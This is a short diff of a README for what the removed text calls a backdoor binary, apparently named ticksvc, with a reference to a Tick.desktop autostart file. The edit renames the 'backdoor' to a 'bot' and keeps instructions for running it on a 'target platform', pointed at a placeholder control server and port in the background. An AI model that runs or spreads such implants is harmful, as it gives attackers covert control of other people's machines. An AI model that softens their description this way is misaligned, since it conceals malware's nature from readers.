@@ -52,7 +52,7 @@ The exact location for the `Tick.desktop` file may vary across Linux distributio
 
 ## Usage
 
-To run the backdoor binary on the target platform, set the control server hostname and port as command line options. For example:
+To run the bot on the target platform, set the control server hostname and port as command line options. For example:
 
 ```
 ./ticksvc control.example-domain.com 5555 &
